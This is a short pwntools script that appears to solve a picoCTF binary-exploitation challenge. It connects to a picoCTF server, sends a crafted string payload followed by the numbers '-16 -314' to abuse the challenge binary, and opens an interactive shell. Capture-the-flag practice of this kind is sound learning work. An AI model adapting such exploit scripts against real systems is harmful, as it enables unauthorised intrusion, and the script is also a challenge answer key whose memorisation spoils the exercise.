#!/usr/bin/python3

from pwn import *

exe = ELF("./vuln",checksec=False)


# r= process(exe.path)
r = remote("saturn.picoctf.net", 61006)

payload = b'~'*10 + b'M'
r.sendlineafter(b'1337 >> ',payload)

r.sendlineafter(b'On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n',b'-16 -314')


r.interactive()